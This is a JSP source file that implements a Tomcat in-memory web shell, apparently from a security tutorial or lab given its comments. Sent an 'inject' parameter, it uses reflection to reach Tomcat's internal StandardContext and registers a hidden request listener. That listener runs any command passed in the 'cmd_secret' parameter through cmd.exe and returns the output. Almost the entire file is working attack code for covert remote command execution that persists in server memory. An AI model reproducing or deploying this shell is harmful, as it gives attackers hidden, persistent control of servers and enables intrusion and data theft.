<%@page import="java.io.BufferedReader" %>
<%@page import="java.io.InputStreamReader" %>
<%@page import="java.lang.reflect.Field" %>
<%@page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@page import="org.apache.catalina.core.ApplicationContext" %>
<%@page import="org.apache.catalina.core.StandardContext" %>

<%
    class ListenerShell implements ServletRequestListener {
        private HttpServletResponse response;
        // custom constructor
        public ListenerShell(HttpServletResponse response) {
            this.response = response;
        }
            
        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
            System.out.println("Request destroyed!!");
        }
        
        // Override lại method
        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            System.out.println("Request initialized!!");
            try {
                ServletRequest sr = sre.getServletRequest();

                if (sr.getParameter("cmd_secret") != null) {
                    Process ps = Runtime.getRuntime().exec("cmd.exe /c " + sr.getParameter("cmd_secret"));
                    BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
                    ServletOutputStream out = this.response.getOutputStream();

                    String s = null;
                    String output = "";
                    while ((s = br.readLine()) != null) {
                        output += s + "\n";
                    }
                    out.print(output);
                    out.flush();
                    out.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }

        }

    }
%>

<%
    if (request.getParameter("inject") != null) {
        // get ServletContext object
        ServletContext servletCtx = request.getServletContext();
        // get ApplicationContextFacade object
        ApplicationContextFacade appCtxFacade = (ApplicationContextFacade) servletCtx;
        // get ApplicationContext object
        Field appCtxFacadeField = ApplicationContextFacade.class.getDeclaredField("context");
        appCtxFacadeField.setAccessible(true);
        ApplicationContext appCtx = (ApplicationContext) appCtxFacadeField.get(appCtxFacade);
        // get StandardContext object
        Field appCtxField = ApplicationContext.class.getDeclaredField("context");
        appCtxField.setAccessible(true);
        StandardContext stdCtx = (StandardContext) appCtxField.get(appCtx);
        
        // add custom listener
        stdCtx.addApplicationEventListener(new ListenerShell(response));

        response.getWriter().println("Shell injected!!");
    }
%>
